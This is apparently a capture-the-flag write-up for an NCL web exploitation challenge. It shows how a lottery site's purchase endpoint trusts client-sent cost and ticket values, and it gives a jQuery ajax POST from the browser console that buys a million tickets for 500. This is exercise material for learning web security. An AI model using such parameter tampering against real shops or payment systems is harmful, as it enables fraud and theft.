NCL —  Web Exploitation 2

The metro lottery website makes a POST request when you buy tickets. The POST params are “cost” which reduces your $$ balance and “tickets” which adds more tickets to your account

So if we can make a POST request by altering the params and adding a high number of tickets then we can have a higher probability of winning and uncover the flag

I tried sending a POST using CURL but that didn’t work

Then I looked into sending a POST request from the console of the browser using ajax. This website was helpful https://api.jquery.com/jquery.post/

Example:

$.ajax({

 type: "POST",

 url: url,

 data: data,

 success: success,

 dataType: dataType

});

The POST request :

$.ajax({

 type: ‘POST’,

 url: ‘/purchase?uid=3cc58268491628f6137887aa8db1079f',

 data: JSON.stringify({“cost”:500,”tickets”:1000000}),

 dataType: ‘json’,

 contentType: ‘application/json’

});
